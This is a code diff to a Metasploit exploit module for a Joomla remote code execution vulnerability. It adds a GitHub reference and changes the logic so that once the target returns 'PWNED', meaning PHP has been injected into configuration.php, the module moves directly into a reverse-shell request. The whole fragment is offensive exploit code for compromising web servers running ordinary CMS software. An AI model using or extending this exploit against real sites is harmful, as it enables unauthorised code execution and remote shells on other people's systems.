@@ -26,7 +26,8 @@ class MetasploitModule < Msf::Exploit::Remote
       'License'        => MSF_LICENSE,
       'References'     =>
         [
-		['URL', 'https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41']
+		['URL', 'https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41'],
+		['URL', 'https://github.com/kiks7/rusty_joomla_rce']
         ],
       'Privileged'     => false, 
       'Platform'       => 'PHP',
@@ -274,12 +275,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	})
     if res.to_s.include? 'PWNED' then
 	print_status('Target P0WN3D! eval your code at /configuration.php with ' + cmd_param_name + ' in a POST')
-	pwned = true
-    end
 
-
-
-    if pwned then
         print_status('Now it\'s time to reverse shell')
 		res = send_request_cgi({
 		'method'     => 'POST',
